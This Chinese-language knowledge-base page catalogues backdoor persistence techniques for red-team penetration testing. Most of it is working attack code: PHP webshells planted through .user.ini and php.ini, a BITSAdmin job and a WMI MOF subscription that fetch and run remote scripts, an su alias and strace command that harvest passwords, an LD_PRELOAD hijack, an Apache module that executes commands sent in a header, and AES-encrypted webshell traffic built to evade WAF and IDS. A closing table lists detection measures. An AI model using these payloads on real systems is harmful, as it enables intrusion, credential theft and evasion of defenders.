---
title: 渗透测试后门持久化技术体系
description: 系统梳理渗透测试中常见的后门持久化技术，涵盖 Web 类、系统类、容器类、扩展类、软件类、日志隐匿与流量加密七大类别的实战利用手法。
category: program-analysis
tags:
- 后门持久化
- 权限维持
- WebShell
- 红队技术
- 免杀绕过
- 日志隐匿
- 流量加密
- 渗透测试
date: 2024-01-15
updated: '2026-11-15'
---

## 概述

本页面系统沉淀渗透测试实战中常见的后门持久化与权限维持技术，按照攻击面划分为 **Web 类**、**系统类**、**容器类**、**扩展类**、**软件类**、**日志隐匿**、**流量加密** 七大类别。每类技术均包含核心原理、利用前提、实战步骤及关联检测对抗视角，旨在为红队演练、HVV 护网行动及应急响应溯源提供结构化知识参考。

> 交叉引用：红队演练全流程 OPSEC 规范见 [[redteam-hw-opsec-guidelines]]，内网隧道与代理技术体系见 [[internal-network-pivoting-techniques]]、[[frp内网渗透应用]]、[[http-proxy-tunneling-goproxy-netsh]]、[[pystinger-socks4-proxy-webshell-pivoting]]。

---

## Web 类后门

### PHP 站点持久化

#### .user.ini 自动包含

**适用场景**：PHP 以 FastCGI 模式运行（如 PHP-FPM + Nginx/Apache）。

**原理**：`.user.ini` 是 PHP 的目录级配置文件，支持 `auto_prepend_file` / `auto_append_file` 指令。在站点可写目录写入 `.user.ini`，指定包含恶意文件，实现访问任意 PHP 脚本时自动执行后门代码。

```ini
; .user.ini
auto_prepend_file = evil.txt
```

**实战要点**：
- 需站点目录写权限
- `evil.txt` 可为 Base64 编码的单行 WebShell（如 `<?php @eval($_REQUEST[cmd]);?>`）
- 修改生效无需重启 PHP-FPM，仅需等待 `user_ini.cache_ttl` 过期（默认 300 秒）

> 关联：PHP WebShell 基础与蚁剑/菜刀连接流程见 [[php-webshell-fundamentals-chopper-analysis]]，WebShell 混淆免杀技术见 [[php-webshell-obfuscation-av-evasion]]。

#### .htaccess 解析劫持

**适用场景**：Apache 启用 `mod_rewrite` 且允许 `AllowOverride All`。

**原理**：通过上传 `.htaccess` 定义自定义处理器，将特定文件名模式映射为 PHP 处理器。

```apache
<FilesMatch "aaa">
    SetHandler application/x-httpd-php
</FilesMatch>
```

同目录上传任意包含 `aaa` 的文件（如 `shell_aaa.jpg`），即可作为 PHP 执行。

#### php.ini 全局自动包含

**适用场景**：拥有 `php.ini` 写权限且能重启 PHP 服务。

**原理**：修改全局 `php.ini` 开启 `allow_url_include=On` 并设置 `auto_prepend_file` 指向 `data://` 协议内嵌的 Base64 Payload。

```ini
allow_url_include = On
auto_prepend_file = "data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pOz8+"
```

重启 PHP 后，全站任意 PHP 请求均会执行解码后的 `@eval($_REQUEST[cmd])`。

#### Pher 环境变量劫持

**原理**：PHP 环境变量 `PHP_INI_SCAN_DIR` 指向的目录下 `.ini` 文件会被自动加载。默认该目录不存在，攻击者可创建目录并写入恶意 `.ini`，再通过文件包含漏洞触发加载。

> 关联：文件包含漏洞利用体系见 [[php-file-inclusion-vulnerability]]、[[xd-security-file-inclusion-notes]]。

---

### ASP/ASPX 站点持久化

**核心思路**：利用 ASP.NET 编译机制，将 WebShell 预编译为 DLL 放入 `bin` 目录，再通过修改 `web.config` 注册 `HttpHandler` 实现全局拦截。

**实战流程**：
1. 准备 WebShell 源码目录（如 `aspxceshi/jumbo.aspx`）
2. 使用 `aspnet_compiler.exe` 预编译输出至 `webshellbin`：
   ```cmd
   C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_compiler.exe -v / -p c:\path\aspxceshi\webshell\ c:\path\aspxceshi\webshellbin\
   ```
3. 从生成的 `PrecompiledApp.config` 获取 `assembly` 与 `type` 值
4. 修改网站根目录 `web.config` 注册全局 `HttpHandler`：
   ```xml
   <system.web>
       <httpHandlers>
           <add verb="*" path="*" type="AssemblyValue, TypeValue" validate="True"/>
       </httpHandlers>
   </system.web>
   ```
5. 将编译产出的 DLL 复制至网站 `bin` 目录
6. 访问任意路径均触发 WebShell

---

### JSP/JSPX 站点持久化

> 原文注明涉及版权问题，仅展示效果图。JSP 类后门常见手法包括：Filter/Listener 注入、JSPX 编译类植入、Tomcat Valve 后门、Spring 内存马等。详细技术可参考 Java 内存马与 Spring 生态攻防研究。

---

## 系统类持久化

### Windows 平台

#### 注册表启动项

经典持久化位置：
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

写入指向 Payload 的命令行即可实现用户登录/系统启动时自动执行。

#### BITSAdmin 后门

利用背景智能传输服务 (BITS) 创建持久化任务：

```cmd
bitsadmin /create backdoor
bitsadmin /addfile backdoor %comspec% %temp%\cmd.exe
bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"
bitsadmin /Resume backdoor
```

**特点**：任务在后台运行，重启后自动恢复，可下载执行远程 SCT 脚本（绕过 AppLocker）。

#### MOF/WMI 事件订阅

编写 `.mof` 文件定义 `__EventFilter`、`ActiveScriptEventConsumer` 及绑定，通过 `mofcomp.exe` 编译注册到 WMI 仓库。示例：每秒触发一次，执行 JScript 下载远程 Payload。

```mof
#pragma namespace("\\\\.\\root\\subscription")
instance of __EventFilter as $EventFilter {
    EventNamespace = "Root\\Cimv2";
    Name = "filtP1";
    Query = "Select * From __InstanceModificationEvent Where TargetInstance Isa \"Win32_LocalTime\" And TargetInstance.Second = 1";
    QueryLanguage = "WQL";
};
instance of ActiveScriptEventConsumer as $Consumer {
    Name = "consP1";
    ScriptingEngine = "JScript";
    ScriptText = "GetObject(\"script:http://172.16.127.1:2333/aaaa\")";
};
instance of __FilterToConsumerBinding {
    Consumer = $Consumer;
    Filter = $EventFilter;
};
```

执行：`mofcomp 1.mof`

> 关联：计划任务持久化高阶技巧（XML 隐藏、Index/SD 键值篡改）见 [[windows-scheduled-task-persistence-techniques]]、[[schtask-persistence-tool]]。

#### 其他常见手法（列举）

- COM 劫持 / COM 对象劫持
- 签名伪造 / 证书窃取
- WMI 消费者绑定（除 MOF 外的永久事件订阅）
- 镜像劫持 (Image File Execution Options / IFEO)
- Netsh 端口转发/助手 DLL 劫持
- Office 启动加载项 / VBA 宏 / 加载项
- 计划任务
- 服务注册
- DLL 搜索顺序劫持
- 启动文件夹 / Winlogon / AppInit_DLLs

---

### Linux 平台

#### Alias 别名记录 Root 密码

在用户 `~/.bashrc` 或 `/etc/profile` 中定义别名，劫持 `su`/`sudo`/`ssh` 等命令记录明文密码。

```bash
alias su='echo "Password: " && read -s pwd && echo $pwd >> /tmp/creds.log && /bin/su'
```

> 参考：https://mp.weixin.qq.com/s?__biz=MzA4NjQxMDcxNA==&mid=2709352583&idx=1&sn=5d1fd02840f0c070036f9c0e70b23958

#### Strace 抓取 SSH 密码

附加到 `sshd` 进程监控读写系统调用，捕获明文密码：

```bash
strace -f -p $(pidof sshd) -o sshd.out.txt -v -e trace=read,write -s 128
```

#### LD_PRELOAD 劫持系统函数

**原理**：动态链接器优先加载 `LD_PRELOAD` 指定的共享库，可劫持任意 libc 函数（如 `getuid`、`open`、`read`、`pam_authenticate` 等）。

**实战示例（劫持 getuid 返回 0 实现提权/绕过检查）**：
```c
// evil.c
#include <unistd.h>
uid_t getuid(void) {
    return 0;
}
```
编译：`gcc -shared -fPIC evil.c -o evil.so`
生效：`export LD_PRELOAD=/path/evil.so` 或写入 `/etc/ld.so.preload`（需 root）

> 关联：PE 不落地执行与手动映射技术（Windows 对应层面）见 [[aceldr-technical-analysis]]、[[pe-manual-mapping-loader-implementation]]。

#### 其他常见手法（列举）

- OpenSSH 后门（修改源码重编译 / Patch 二进制 / `AuthorizedKeysCommand` 劫持）
- Rootkit（内核模块 LKM / 用户态库劫持 / eBPF Rootkit）
- `cron` / `systemd` 定时任务
- `~/.ssh/authorized_keys` 投放公钥
- `pam.d` 配置篡改
- `bashrc` / `profile` / `rc.local` 启动脚本
- `cap_setuid`/`cap_setgid` 能力滥用
- 容器逃逸后的宿主机持久化（见 [[docker-container-security-fundamentals]]、[[kubernetes-penetration-testing]]）

---

## 容器类后门

### IIS ISAPI 后门

**原理**：IIS ISAPI 扩展作为原生 DLL 加载在 `w3wp.exe` 进程中，拥有高权限且长驻内存。编写恶意 ISAPI DLL（如 `micropoor_iis`），注册到 IIS 网站/应用程序，可拦截任意 HTTP 请求并执行命令/反弹 Shell。

**部署**：将 DLL 放置于站点目录，通过 IIS 管理器添加“ISAPI 和 CGI 限制”并启用，或修改 `applicationHost.config` 直接注册。

**特点**：无文件 WebShell，流量隐蔽，重启 IIS 后自动加载。

### Apache 模块后门

**原理**：利用 `apxs` 编译安装恶意 Apache 模块（`.so`），在 `hook` 阶段（如 `header_parser`）检测特定 Header（如 `Backdoor: cmd`）并执行系统命令。

**核心代码片段**：
```c
static int backdoor_handler(request_rec *r) {
    const char *cmd = apr_table_get(r->headers_in, "Backdoor");
    if (cmd) {
        system(cmd);
        return OK;
    }
    return DECLINED;
}
```

**部署**：
```bash
apxs -i -a -c mod_backdoor.c && service apache2 restart
```
`-a` 自动在 `httpd.conf` 写入 `LoadModule backdoor_module /usr/lib64/httpd/modules/mod_backdoor.so`。

**利用**：发送任意请求携带 `Backdoor: id` 头即可执行命令。

---

## 扩展类后门

### PHP 扩展后门

**原理**：编写恶意 PHP 扩展（`.so` / `.dll`），在 `RINIT`/`MINIT` 钩子中注册自动执行逻辑。通过 `php.ini` 加载扩展：

```ini
extension=evil.so
```

**效果**：访问任意 PHP 页面均触发扩展内 Payload（如反弹 Shell、内存马注入、Hook 关键函数）。

**优势**：加载早于脚本执行，难以被应用层 WAF/扫描器发现，适合长期权限维持。

> 关联：PHP 内存马与扩展层面攻防可参考 [[struts2-memory-shell-injection]]（Java 对应思路）、[[inceptor-av-edr-evasion-framework]]（免杀框架视角）。

---

## 软件类后门

### DLL 劫持 / DLL 搜索顺序劫持

**Windows DLL 搜索顺序（默认 SafeDllSearchMode 开启）**：
1. 应用程序所在目录
2. 系统目录 (`C:\Windows\System32`)
3. 16 位系统目录 (`C:\Windows\System`)
4. Windows 目录 (`C:\Windows`)
5. 当前工作目录
6. `PATH` 环境变量目录

**利用条件**：
- 目标 EXE 运行时加载的 DLL **不在** `KnownDLLs` 注册表键值中（`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`）
- 攻击者可在上述优先目录写入同名恶意 DLL

**实战排查工具**：Process Monitor (Procmon) 筛选 "Load Image" 事件，观察 `NAME NOT FOUND` 后最终加载路径，定位可劫持 DLL。

**防御**：
- 将关键 DLL 加入 `KnownDLLs`
- 启用 `SafeDllSearchMode`（默认开启）
- 使用绝对路径加载 DLL / `SetDllDirectory` / `AddDllDirectory`
- 应用程序签名验证 / WHQL 签名

---

## 日志隐匿与伪装

### HTTP 状态码伪造

**默认访问**：正常 200 OK 记录在访问日志中。

**伪造 404**：发送特定 Header（如 `X-Original-URL`、`X-Rewrite-URL`）触发中间件重写/路由异常，导致日志记录为 404，但应用层仍正常处理请求并返回结果。

**进阶：UA 条件判断**：
结合 `User-Agent` 判断，仅在特定 UA 下执行后门逻辑，其他 UA 返回正常页面/404，降低日志分析与蜜罐触发概率。

```php
if (strpos($_SERVER['HTTP_USER_AGENT'], 'Mozilla') !== false) {
    // 正常业务逻辑
} elseif ($_SERVER['HTTP_X_BACKDOOR'] === 'secret') {
    // 后门逻辑
} else {
    http_response_code(404);
    exit;
}
```

> 关联：应急响应日志分析与 WebShell 溯源见 [[xd-security-incident-response-notes]]、[[threat-attribution-tracing-techniques]]。

---

## 流量加密与 C2 通信隐匿

以蚁剑为例，实现**双向 AES 加密**对抗流量检测。

### 整体加密流程

1. **客户端（蚁剑）**：Payload -> AES 加密 -> 发送
2. **服务端（WebShell）**：接收 -> AES 解密 -> 执行 -> 结果 AES 加密 -> 返回
3. **客户端**：接收 -> AES 解密 -> 显示

### 编码器：请求加密

在蚁剑“编码器”配置中实现 `encode` 函数，对 `_POST[cmd]` 进行 AES 加密（需与服务端约定 Key/IV/Mode/Padding）。

```javascript
// 蚁剑编码器示例
module.exports = (pwd, data, ext = {}) => {
    // data[pwd] 即 payload，如 system('id')
    // 返回加密后的字符串，赋值给 data[pwd]
    const CryptoJS = require('crypto-js');
    const key = CryptoJS.enc.Utf8.parse('1234567890abcdef'); // 16 字节 Key
    const iv  = CryptoJS.enc.Utf8.parse('abcdef1234567890'); // 16 字节 IV
    const encrypted = CryptoJS.AES.encrypt(data[pwd], key, { iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 });
    data[pwd] = encrypted.toString();
    return data;
};
```

抓包验证：请求体呈现 Base64 密文，特征码消失。

### 服务端 WebShell 解密执行

```php
<?php
$key = '1234567890abcdef';
$iv  = 'abcdef1234567890';
$payload = openssl_decrypt($_POST['cmd'], 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
eval($payload); // 或 system/passthru 等
?>
```

### 解码器：响应加密

蚁剑“解码器”配置 `decode` 函数，对服务端返回结果进行 AES 加密（客户端自动调用解密显示）。

```javascript
// 蚁剑解码器示例
module.exports = (pwd, data, ext = {}) => {
    // data 为服务端返回的明文结果
    const CryptoJS = require('crypto-js');
    const key = CryptoJS.enc.Utf8.parse('1234567890abcdef');
    const iv  = CryptoJS.enc.Utf8.parse('abcdef1234567890');
    const encrypted = CryptoJS.AES.encrypt(data, key, { iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 });
    return encrypted.toString(); // 返回密文，蚁剑自动解密显示
};
```

### 效果验证

- 请求包：`cmd=U2FsdGVkX1+...`（Base64 密文）
- 响应包：`U2FsdGVkX1+...`（Base64 密文）
- 中间设备（WAF/IDS/防火墙）无法还原明文命令与结果，实现流量层面隐匿。

> 关联：C2 流量混淆与 Malleable C2 Profile 配置见 [[c2-redirectors-malleable-c2-profiles]]、[[cobalt-strike-ssl-keystore-evasion]]、[[cobalt-strike-external-c2-smb-beacon]]；内存扫描对抗与 UDRL 技术见 [[memory-scanning-tools-evasion-techniques]]、[[inceptor-av-edr-evasion-framework]]、[[process-injection-tampering-techniques]]、[[phantom-dll-hollowing-technique]]。

---

## 纵向对抗视角总结

| 类别 | 典型技术 | 检测难点 | 对抗建议 |
|------|----------|----------|----------|
| **Web 类** | `.user.ini`、`.htaccess`、php.ini、Pher、ASP.NET HttpHandler、JSP Filter/Valve | 配置文件合法、无进程异常、文件时间戳可伪造 | 文件完整性监控 (FIM)、Web 目录不可写、PHP `auto_prepend_file` 禁用、Apache `AllowOverride None`、ASP.NET `compilation debug=false` |
| **系统类** | 注册表 Run、BITS、MOF/WMI、计划任务、服务、DLL 劫持、Rootkit | 机制合法、持久化点多、用户态/内核态均可 | Sysmon Event ID 1/12/13/19/20、注册表/文件/计划任务/WMI 审核、EDR 内核回调拦截（ObRegisterCallbacks）、PPL 保护关键进程 |
| **容器类** | ISAPI、Apache Module | 运行在 Web 服务进程内存中、无独立进程 | 模块加载审计、Web 服务完整性校验、最小权限运行、WAF/IDS 语义分析 |
| **扩展类** | PHP Extension、Python 模块、Java Agent | 加载早、Hook 深、应用层不可见 | 扩展目录权限收紧、启动参数审计、运行时 Hook 检测（如 `dlopen`/`LoadLibrary` 监控） |
| **软件类** | DLL 劫持、COM 劫持、签名伪造 | 利用正常加载流程、白名单程序触发 | KnownDLLs、代码签名强制验证、AppLocker/WDAC、DLL 搜索顺序审计 |
| **日志隐匿** | 状态码伪造、UA 条件执行、日志删除/篡改 | 日志源不可信、关联分析断链 | 多源日志关联（网络/主机/应用）、WAF 原始请求体保存、日志写时只读/异地备份 |
| **流量加密** | 对称加密（AES/RC4）、非对称加密、域前置、CDN 隐匿、协议模仿 | 流量特征消失、证书合法、混入正常业务 | TLS 指纹识别 (JA3/JA3S)、流量基线建模、异常连接行为分析、SSL 检测中间人、C2 框架特征库匹配 |

---

## 交叉引用索引

- **WebShell 基础与变种**：[[php-webshell-fundamentals-chopper-analysis]]、[[php-webshell-obfuscation-av-evasion]]、[[php-non-alphanumeric-webshell-construction]]、[[cnvd-2021-49104-eoffice-v9-file-upload-rce]]
- **文件包含与配置滥用**：[[php-file-inclusion-vulnerability]]、[[xd-security-file-inclusion-notes]]、[[xd-security-pentest-basic-stage-notes]]
- **Windows 持久化高阶**：[[windows-scheduled-task-persistence-techniques]]、[[schtask-persistence-tool]]、[[windows-token-nerfing-pplguard-trusted-labels]]、[[ppl-injection-createprocess-bof-fix]]、[[ppldump-userland-ppl-bypass-evasion]]
- **内网隧道与横向移动**：[[internal-network-pivoting-techniques]]、[[frp内网渗透应用]]、[[http-proxy-tunneling-goproxy-netsh]]、[[pystinger-socks4-proxy-webshell-pivoting]]、[[cobalt-strike-external-c2-smb-beacon]]、[[smb-named-pipe-c2-communication]]、[[named-pipe-smb-detection-sysmon]]
- **免杀与内存对抗**：[[inceptor-av-edr-evasion-framework]]、[[memory-scanning-tools-evasion-techniques]]、[[aceldr-technical-analysis]]、[[pe-manual-mapping-loader-implementation]]、[[process-injection-tampering-techniques]]、[[phantom-dll-hollowing-technique]]、[[argument-spoofing-edr-evasion]]、[[dotnet-clr-usage-log-tampering-edr-evasion]]
- **C2 基础设施隐匿**：[[c2-redirectors-malleable-c2-profiles]]、[[cobalt-strike-ssl-keystore-evasion]]、[[covenant-c2-framework-analysis]]、[[iox-proxy-protocol-evasion]]
- **应急响应与溯源**：[[xd-security-incident-response-notes]]、[[threat-attribution-tracing-techniques]]、[[log4j2-rce-reproduction]]、[[shiro-internal-penetration-case-study]]
- **红队 OPSEC 规范**：[[redteam-hw-opsec-guidelines]]
- **容器与云原生安全**：[[docker-container-security-fundamentals]]、[[kubernetes-penetration-testing]]
- **漏洞挖掘与实战案例**：[[vulnerability-mining-recon-aiqicha-fofa]]、[[listed-company-penetration-test-case-study]]、[[loan-company-penetration-test-case-study]]、[[medical-system-internal-penetration-case-study]]、[[card-game-platform-penetration-test-case-study]]、[[edu-src-penetration-test-case-study]]、[[0x6270-penetration-test-case-study-2023]]

---

## 参考资料与延伸阅读

- 原文来源：微信公众号文章《渗透中的后门利用》
- MITRE ATT&CK：Persistence (TA0003) / Defense Evasion (TA0005) / Command and Control (TA0011)
- Windows Internals 系列（第 7 版）第 4、5、13 章
- 《Red Team Field Manual》(RTFM) / 《Blue Team Field Manual》(BTFM)
- 0x727、0x6270、XD安全、无名安全团队等社区公开实战笔记与工具链

> 本页面持续更新，欢迎补充新技术、检测规则与实战案例。

## 来源

- [226安全团队-201805-202103_10](../sources/226安全团队-201805-202103_10.md)
